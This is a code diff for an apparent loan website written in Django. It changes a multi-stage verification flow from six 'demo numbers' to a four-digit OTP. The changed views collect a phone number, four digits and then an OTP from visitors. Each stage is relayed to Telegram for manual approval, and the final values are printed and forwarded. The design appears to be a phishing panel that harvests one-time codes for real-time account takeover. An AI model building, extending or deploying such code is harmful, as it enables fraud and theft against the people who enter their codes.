@@ -125,14 +125,14 @@ def request_verification_view(request):
 
 
 # ============================================================
-# 6 DEMO NUMBERS (after Telegram approval)
+# 4 DEMO NUMBERS (OTP stage - previously 6)
 # ============================================================
 
 def otp_view(request):
     """
-    Page where user enters the 6 demo numbers.
+    Page where user enters the 4 demo numbers.
     Only reachable after Telegram approval of the 4 numbers.
-    On submit → send Telegram for approval of the 6 numbers.
+    On submit → send Telegram for approval of the 4 numbers.
     """
     verification_id = request.session.get("verification_id")
 
@@ -149,19 +149,17 @@ def otp_view(request):
         num2 = request.POST.get("num2", "")
         num3 = request.POST.get("num3", "")
         num4 = request.POST.get("num4", "")
-        num5 = request.POST.get("num5", "")
-        num6 = request.POST.get("num6", "")
 
-        demo_numbers_6 = num1 + num2 + num3 + num4 + num5 + num6
+        demo_numbers_6 = num1 + num2 + num3 + num4
 
-        if len(demo_numbers_6) != 6 or not demo_numbers_6.isdigit():
+        if len(demo_numbers_6) != 4 or not demo_numbers_6.isdigit():
             return render(
                 request,
                 "loan/otp.html",
                 {"error": "Please enter a valid OTP code."},
             )
 
-        # Save the 6 numbers
+        # Save the 4 numbers
         request.session["demo_numbers_6"] = demo_numbers_6
         request.session.modified = True
 
@@ -187,7 +185,7 @@ def otp_view(request):
         request.session["current_stage"] = "6"
         request.session.modified = True
 
-        # Send Telegram for 6-number approval
+        # Send Telegram for 4-number approval
         message_id = send_demo_verification_request(
             verification.id,
             phone,
@@ -206,19 +204,17 @@ def otp_view(request):
 
 def verify_otp_view(request):
     """
-    Handles POST of the 6 demo numbers (same logic as otp_view POST).
+    Handles POST of the 4 demo numbers (same logic as otp_view POST).
     """
     if request.method == "POST":
         num1 = request.POST.get("num1", "")
         num2 = request.POST.get("num2", "")
         num3 = request.POST.get("num3", "")
         num4 = request.POST.get("num4", "")
-        num5 = request.POST.get("num5", "")
-        num6 = request.POST.get("num6", "")
 
-        demo_numbers_6 = num1 + num2 + num3 + num4 + num5 + num6
+        demo_numbers_6 = num1 + num2 + num3 + num4
 
-        if len(demo_numbers_6) == 6 and demo_numbers_6.isdigit():
+        if len(demo_numbers_6) == 4 and demo_numbers_6.isdigit():
             request.session["demo_numbers_6"] = demo_numbers_6
             request.session["verification_completed"] = True
             request.session["verification_status"] = "completed"
@@ -228,14 +224,14 @@ def verify_otp_view(request):
         return render(
             request,
             "loan/otp.html",
-            {"error": "Please enter a valid 6-digit demo code."},
+            {"error": "Please enter a valid 4-digit demo code."},
         )
 
     return redirect("otp")
 
 
 def waiting_for_approval_6_view(request):
-    """Waiting page after submitting the 6 demo numbers."""
+    """Waiting page after submitting the 4 demo numbers."""
     verification_id = request.session.get("verification_id_6")
 
     if not verification_id:
@@ -311,7 +307,7 @@ def verification_status_view(request):
 def approved_view(request):
     """
     Shown after Telegram approval.
-    User continues to the 6-digit demo numbers page.
+    User continues to the 4-digit OTP page.
     """
     verification_id = request.session.get("verification_id")
 
@@ -431,7 +427,7 @@ def success_view(request):
 
     print("===== DEMO VALUES =====")
     print("4 Demo Numbers:", demo_numbers_4)
-    print("6 Demo Numbers:", demo_numbers_6)
+    print("OTP (4 digits):", demo_numbers_6)
     print("=======================")
 
     # Build and send final Telegram message
